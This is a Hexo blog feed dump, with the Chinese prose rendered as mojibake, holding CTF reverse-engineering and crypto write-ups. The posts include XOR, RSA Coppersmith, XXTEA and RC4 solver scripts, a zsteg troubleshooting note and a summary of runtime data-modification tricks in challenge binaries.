erlang-repl">SYC&#123;W0w!y0u_@re_th3_BeSt_blasting_Exp3rt!!&#125;<br></code></pre></td></tr></table></figure><h2 id="you-do-what"><a href="#you-do-what" class="headerlink" title="you_do_what"></a>you_do_what</h2><p>v17-&gt;v4-&gt;v25+2</p><p>åé¢å‘ç°v25+2å¥½åƒå’Œè¾“å…¥è¿˜æœ‰å…³ç³»</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731897298977-d1e0f639-82d9-4a74-9e21-7558233f15d1.png" class="" title="img"><p>inputè¿›å»ä¹‹åç›´æ¥æ˜¯å¼‚æˆ–ï¼Œåˆå› ä¸ºæ–‡ä»¶æ˜¯gifï¼Œè€ƒè™‘æ ¹æ®æ–‡ä»¶å¤´æ¨å‡ºå‰å‡ ä½å¼‚æˆ–çš„å­—ç¬¦ï¼Œå‘ç°æ˜¯qwerty</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731900256443-c6ba3bee-76ab-4018-a099-812cc0b5869f.png" class="" title="img"><p>åŠ ä¸Šinputæ˜¯16çš„å€æ•°</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731900369217-b91309ea-9009-477a-829e-1574626fdc77.png" class="" title="img"><p>é‚£å°±çŒœä¸€ä¸‹key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">data=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;E:\\CTF_Attachments\\Geek\\2024\Re\\you_do_what\\Dusk_witnesses_devout_believers.gif&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>data=<span class="hljs-built_in">bytearray</span>(data)<br>key=<span class="hljs-built_in">list</span>(<span class="hljs-string">b&#x27;qwertyuiopasdfgh&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data) - <span class="hljs-number">1</span>):   <br>    data[i] = data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.gif&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br></code></pre></td></tr></table></figure><p>å‘ç°æ˜¯å¯¹çš„</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731900099293-a7eaf023-256c-4f24-8ab1-541f8354fc20.png" class="" title="img"><p>v26å’Œv25+2æœ€åè¿˜æ˜¯ä¸ç›¸ç­‰ï¼Œé€†ä¸æ˜ç™½ï¼Œæš‚æ—¶å°±å…ˆè¿™æ ·</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>mé«˜ä½æ³„éœ²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span><br>c = <span class="hljs-number">9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span><br>h = <span class="hljs-number">111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span><br>e = <span class="hljs-number">3</span><br><span class="hljs-comment"># m=(h+2023)//2024</span><br><span class="hljs-comment"># print(m)</span><br>m1=<span class="hljs-number">55098146333703730947926790790691720107068601034889480665048328600442527334253415639480889244019378785454550164687091675430912</span><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = (m1 + x)^e - c<br>res = f.small_roots(X = <span class="hljs-number">2</span>^<span class="hljs-number">150</span>,beta = <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> res != []:<br>m = m1 + res[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br><span class="hljs-comment">#SYC&#123;crypto_is_very_interesting_why_dont_you_join_us&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>teaé­”æ”¹</tag>
      
      <tag>aesé­”æ”¹</tag>
      
      <tag>æ•´æ•°æº¢å‡º</tag>
      
      <tag>md5åŠ å¯†</tag>
      
      <tag>sm4</tag>
      
      <tag>hashcatçˆ†ç ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zstegå¼‚å¸¸ä¹‹æ ˆçº§åˆ«å¤ªæ·±</title>
    <link href="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/"/>
    <url>/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/</url>
    
    <content type="html"><![CDATA[<p>2023.10.17</p><p>æš‘å‡ä¹Ÿé‡åˆ°è¿‡ï¼Œä¹‹å‰é‡è£…äº†ä¸€ä¸‹zstegå°±è§£å†³äº†ï¼Œç°åœ¨å†æ•´ç†ä¸€ä¸‹</p><p>æ®è¯´æ˜¯é€’å½’çš„åŸå› </p><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697546820671-5d9ee7d3-5c48-4fb4-9acf-99593dfb2b59.png" class="" title="img"><p>åœ¨ç½‘ä¸Šæ‰¾åˆ°è¿™ä¸ª</p><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697547157743-a13d79eb-2cfe-4b3c-93cd-d0f9f51c68dc.jpeg" class="" title="img"><p>è¦å»zshrcæ·»åŠ è¯­å¥</p><p>å…ˆæ‰¾åˆ°zshrc</p><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697547289945-a5e8049f-88d1-43ce-972a-fa0b38923fc4.png" class="" title="img"><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697546976703-6d326e0f-fe98-4d34-b9b2-476e1bb736e6.png" class="" title="img"><p>ç„¶åæ·»åŠ ä¸Šå»</p><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697547055836-01967642-2864-4aa3-90cc-5e6157f3eddb.png" class="" title="img"><p>æœ€åå°±åˆå¯ä»¥ç”¨å•¦</p><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697547471571-d31b35be-4931-4903-b538-d02314c1cf17.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ•°æ®ä¿®æ”¹æ€»ç»“</title>
    <link href="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/"/>
    <url>/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>ä¸€èˆ¬æ¥è¯´ï¼ŒCTFæ¯”èµ›ä¸­é€†å‘æ–¹å‘çš„é¢˜ç›®å¦‚æœæŒ‰ç…§é™æ€çš„æ•°æ®è§£ä¸å‡ºæ¥ï¼Œä¸”è®¤ä¸ºç¨‹åºé€»è¾‘åˆ†ææ²¡æœ‰ä»€ä¹ˆçš„è¯ï¼Œæœ‰å¯èƒ½åŠ¨æ€è¿è¡Œç¨‹åºçš„æ—¶å€™æ•°æ®æœ‰ä¿®æ”¹ï¼Œä¸‹é¢æ˜¯å‡ ç§å¸¸è§çš„ä¿®æ”¹æ•°æ®çš„ç±»å‹</p><h1 id="äº¤å‰å¼•ç”¨"><a href="#äº¤å‰å¼•ç”¨" class="headerlink" title="äº¤å‰å¼•ç”¨"></a>äº¤å‰å¼•ç”¨</h1><p>ä¸€èˆ¬æ•°æ®çš„ä¿®æ”¹éƒ½å¯ä»¥ç›´æ¥äº¤å‰å¼•ç”¨ctrl+xæˆ–è€…xæ‰¾åˆ°å¦å¤–å¼•ç”¨è¯¥å†…å­˜çš„åœ°æ–¹ï¼Œå‡ºç°çš„é¢‘ç‡ä¹Ÿæœ€é«˜</p><h2 id="2025æ•°å­—ä¸­å›½æ•°å­—å®‰å…¨èµ›é“åˆèµ›æ•°å­—å®‰å…¨-éšç§ä¿æŠ¤"><a href="#2025æ•°å­—ä¸­å›½æ•°å­—å®‰å…¨èµ›é“åˆèµ›æ•°å­—å®‰å…¨-éšç§ä¿æŠ¤" class="headerlink" title="2025æ•°å­—ä¸­å›½æ•°å­—å®‰å…¨èµ›é“åˆèµ›æ•°å­—å®‰å…¨-éšç§ä¿æŠ¤"></a>2025æ•°å­—ä¸­å›½æ•°å­—å®‰å…¨èµ›é“åˆèµ›æ•°å­—å®‰å…¨-éšç§ä¿æŠ¤</h2><p>unk_50c0å˜é‡åœ¨mainé‡Œé¢æ²¡æœ‰èµ‹åˆå€¼ä½†æ˜¯åç»­å¼‚æˆ–ä¼šç”¨åˆ°</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1744270058716-53d6fb1c-630f-40e0-887e-52781456f690.png" class="" title="img"><p>é¼ æ ‡ç‚¹åœ¨å˜é‡ä¸Šåœ¨æŒ‰xå°±èƒ½å‘ç°å…¶ä»–å‡½æ•°ä¹Ÿè°ƒç”¨è¿™ä¸ªå˜é‡</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1744270315043-78935ad0-9202-43a5-89e1-7c50fb8b064c.png" class="" title="img"><p>å‘ç°å¯¹byte50c0å˜é‡ï¼ˆunk_50c0æœ¬è´¨ä¸Šåªæ˜¯ä¸çŸ¥é“ç±»å‹è€Œå·²ï¼‰æœ‰èµ‹å€¼</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1744270338650-022f4e91-b19a-466f-ba33-a3b02a873e0c.png" class="" title="img"><h1 id="init-array"><a href="#init-array" class="headerlink" title="init_array"></a>init_array</h1><h2 id="2023æµ™æ±Ÿçœçœèµ›å†³èµ›re3"><a href="#2023æµ™æ±Ÿçœçœèµ›å†³èµ›re3" class="headerlink" title="2023æµ™æ±Ÿçœçœèµ›å†³èµ›re3"></a>2023æµ™æ±Ÿçœçœèµ›å†³èµ›re3</h2><p>ctrl+sæŸ¥çœ‹æ•°æ®æ®µï¼Œå‘ç°init_arrayæœ‰å‡½æ•°</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1723080514139-5a122714-ef72-42e2-a28d-8602220cc855-17442716923914.png" class="" title="img"><p>å‡½æ•°ç‚¹è¿›å»åå‘ç°æœ‰ä¿®æ”¹ï¼Œå‰é¢ä¸€éƒ¨åˆ†ç›¸å½“äºç‰¹å¾ç æœç´¢ï¼Œæ‰¾åˆ°i+31çš„åœ°æ–¹æ”¹ä¸º75</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1723221982668-6fb06871-e612-49aa-8938-b6711997f2ee-17442716923916.png" class="" title="img"><p>å¤§æ¦‚ç‡æ˜¯åœ¨teaç®—æ³•ä¸­æœ‰ä¿®æ”¹ï¼Œå› ä¸ºçœ‹æ±‡ç¼–æœ‰ä¸€æ®µå¾ˆå¥‡æ€ªçš„æŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯4ä¸ªnop</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1723222235101-b3905bf7-866e-428d-9d03-984d46d1277e-17442716923918.png" class="" title="img"><p>åŸæ¥çš„0bæ”¹ä¸º4bï¼Œä»addå˜æˆsubï¼Œé‚£å¤§æ¦‚ç‡æ˜¯å¯¹çš„</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1723224496274-7a060096-a6e2-47ad-b032-72f26dc002ee-174427169239110.png" class="" title="img"><h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><h2 id="2023NewStarCTFweek3EzDll"><a href="#2023NewStarCTFweek3EzDll" class="headerlink" title="2023NewStarCTFweek3EzDll"></a>2023NewStarCTFweek3EzDll</h2><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1730010227548-177c274a-f88b-405c-9464-881c19dd2604-174427169239112.png" class="" title="img"><p>å‡½æ•°åˆ—è¡¨æœ€å¼€å§‹å¯èƒ½ä¼šå‡ºç°tls_callbackå‡½æ•°ï¼Œå…ˆäºmainæ‰§è¡Œï¼Œmainè¿è¡Œç»“æŸåˆå›åˆ°tlsï¼Œä¸€èˆ¬tlsä¼šå’ŒèŠ±æŒ‡ä»¤ç­‰ç»“åˆï¼Œåœ¨å‡½æ•°åˆ—è¡¨ä¹Ÿèƒ½æœåˆ°</p><p>åŒæ—¶æ³¨æ„æœ‰åè°ƒè¯•ï¼Œæ­£å¸¸éƒ½æ˜¯ä¸è°ƒè¯•æ‰èƒ½è·å¾—æ­£ç¡®å¯†æ–‡ï¼Œæ‰€ä»¥è¿™é‡Œç¬¬ä¸€ä¸ªkeyæ˜¯5è€Œä¸æ˜¯6</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1722600582598-fa60272c-057a-4d35-ae38-2d57674c7ba0-174427169239114.png" class="" title="img"><h1 id="init-function"><a href="#init-function" class="headerlink" title="init_function"></a>init_function</h1><h2 id="2023NewStarCTFweek4iwannarest"><a href="#2023NewStarCTFweek4iwannarest" class="headerlink" title="2023NewStarCTFweek4iwannarest"></a>2023NewStarCTFweek4iwannarest</h2><p>keyåœ¨init_functionè¢«ä¿®æ”¹</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1722854773547-8b3d27b9-d596-41cd-99e3-fd1ea2d2289f-174427169239116.png" class="" title="img"><p>xxteaè§£å¯†çš„keyè¢«é‡æ–°èµ‹å€¼äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9E3779B9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (z &gt;&gt; 5 ^ y <span class="hljs-string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4) ^ (sum ^ y) + (k[(p &amp; 3) ^ e] ^ z)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">xxtea_encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">uint32_t</span> len, <span class="hljs-type">uint32_t</span> *k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> n = len - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> y, z, sum = <span class="hljs-number">0</span>, e, p, q;<br>    q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / len;<br>    <span class="hljs-keyword">while</span> (q-- &gt; <span class="hljs-number">0</span>) &#123;<br>        sum += DELTA;<br>        e = sum &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span>;<br>        <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n; p++) &#123;<br>            y = v[p + <span class="hljs-number">1</span>];<br>            z = v[p] += MX;<br>        &#125;<br>        y = v[<span class="hljs-number">0</span>];<br>        z = v[n] += MX;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">xxtea_decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">uint32_t</span> len, <span class="hljs-type">uint32_t</span> *k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> n = len - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> y, z, sum, e, p, q;<br>    q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / len;<br>    sum = q * DELTA;<br>    y = v[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">while</span> (sum != <span class="hljs-number">0</span>) &#123;<br>        e = sum &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span>;<br>        <span class="hljs-keyword">for</span> (p = n; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>            z = v[p - <span class="hljs-number">1</span>];<br>            y = v[p] -= MX;<br>        &#125;<br>        z = v[n];<br>        y = v[<span class="hljs-number">0</span>] -= MX;<br>        sum -= DELTA;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">8</span>] = &#123; <br>      <span class="hljs-number">3962803346</span>,<span class="hljs-number">3145558623</span>,<span class="hljs-number">1541010058</span>,<span class="hljs-number">1093420299</span>,<br>      <span class="hljs-number">3315082129</span>,<span class="hljs-number">861271549</span>,<span class="hljs-number">352576336</span>,<span class="hljs-number">60051825</span>, &#125;;<br>      <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> &#125;;<br>      <span class="hljs-type">uint32_t</span> i;<br>      <span class="hljs-type">uint32_t</span> temp[<span class="hljs-number">2</span>];<br>      <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>)&#123;<br>        temp[<span class="hljs-number">0</span>] = v[i]; <br>        temp[<span class="hljs-number">1</span>] = v[i + <span class="hljs-number">1</span>]; <br>        xxtea_decrypt(temp, <span class="hljs-number">2</span>, key);<br>        v[i] = temp[<span class="hljs-number">0</span>];<br>        v[i + <span class="hljs-number">1</span>] = temp[<span class="hljs-number">1</span>];<br>      &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-type">char</span> *)v);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//flag&#123;GDu7Il0v3uP1zl3tm3Gr@duate&#125;?</span><br></code></pre></td></tr></table></figure><h1 id="mainå‡½æ•°å‰"><a href="#mainå‡½æ•°å‰" class="headerlink" title="mainå‡½æ•°å‰"></a>mainå‡½æ•°å‰</h1><p>å½“å‰é¢å‡ ç§æ–¹æ³•å¤±æ•ˆçš„æ—¶å€™å¯ä»¥mainå‡½æ•°å¾€ä¸Šæ‰¾ä¸€æ‰¾</p><h2 id="2024ISCCRe-Find-All"><a href="#2024ISCCRe-Find-All" class="headerlink" title="2024ISCCRe-Find_All"></a>2024ISCCRe-Find_All</h2><p>è¿™é¢˜å°±æ˜¯åœ¨mainå‡½æ•°å‰é¢æœ‰å¯ç–‘æ•°æ®</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1715168249079-52d70d9e-0399-4ce9-8b06-6743231f3bcc-174427169239118.png" class="" title="img"><p>äº¤å‰å¼•ç”¨æ‰¾åˆ°çˆ¶å‡½æ•°ï¼Œæ‰¾åˆ°å¯èƒ½çš„åŠ å¯†é€»è¾‘ï¼Œ4ä¸ªä¸€å¾ªç¯ç„¶åç›¸é‚»ä½ç½®å¼‚æˆ–</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1715168293859-8aff9d2d-102a-41d5-98ce-3d1c14660c06-174427169239120.png" class="" title="img"><p>å»è¯•è¯•çœ‹ï¼Œå‘ç°æ˜¯å¯¹çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">26</span>,<span class="hljs-number">16</span>,<span class="hljs-number">0</span>,<span class="hljs-number">67</span>,<span class="hljs-number">8</span>,<span class="hljs-number">32</span>,<span class="hljs-number">18</span>,<span class="hljs-number">65</span>,<span class="hljs-number">113</span>,<span class="hljs-number">1</span>,<span class="hljs-number">119</span>,<span class="hljs-number">68</span>,<span class="hljs-number">35</span>,<span class="hljs-number">1</span>,<span class="hljs-number">34</span>,<span class="hljs-number">99</span>,<span class="hljs-number">35</span>,<span class="hljs-number">7</span>,<span class="hljs-number">18</span>,<span class="hljs-number">118</span>,<span class="hljs-number">39</span>,<span class="hljs-number">97</span>,<span class="hljs-number">92</span>,<span class="hljs-number">125</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">24</span>,<span class="hljs-number">4</span>):<br>    a[i + <span class="hljs-number">2</span>] = a[i + <span class="hljs-number">2</span>] ^ a[i + <span class="hljs-number">3</span>]<br>    a[i + <span class="hljs-number">1</span>] = a[i + <span class="hljs-number">1</span>] ^ a[i + <span class="hljs-number">2</span>]<br>    a[i]=a[i]^a[i+<span class="hljs-number">1</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#ISCC&#123;sSAC23Dc@Ac@cdvg@!&#125;</span><br></code></pre></td></tr></table></figure><p><a href="æ•°æ®ä¿®æ”¹æ€»ç»“/download/æ•°æ®ä¿®æ”¹æ€»ç»“é™„ä»¶.zip" download>æ•°æ®ä¿®æ”¹æ€»ç»“é™„ä»¶.zip</a></p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æµ™æ±Ÿçœçœèµ›2024å†³èµ›wp</title>
    <link href="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/"/>
    <url>/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a><strong>Re2</strong></h2><p>upxé­”æ”¹</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225551114-2b85de62-0f34-46b9-87a4-add343090308.png" class="" title="img"><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225556112-d7f85dae-67cc-4f9b-bd01-79007883786f.png" class="" title="img"><p>ç„¶åç›´æ¥base64å˜è¡¨</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225562160-a66130c9-b178-41dd-961a-e9ffc15b5d57.png" class="" title="img"><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225568502-6ba1b995-eb09-4926-9e77-50ebd10518cc.png" class="" title="img"><h2 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h2><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225621390-a77158f0-69d7-409c-98d1-5f7aefc3053f.png" class="" title="img"><p>Rc4å¾—åˆ°çœŸæ­£çš„key</p><img src="/2024/11/12/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%86%B3%E8%B5%9Bwp/1731225590433-7d6cb192-805b-4d90-9ce4-bbfffab4926f.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> out<br><br><br>data = <span class="hljs-string">b&#x27;ban_debug!&#x27;</span><br>key = <span class="hljs-string">b&#x27;keykey&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><br><span class="hljs-comment">#[105, 13, 90, 178, 64, 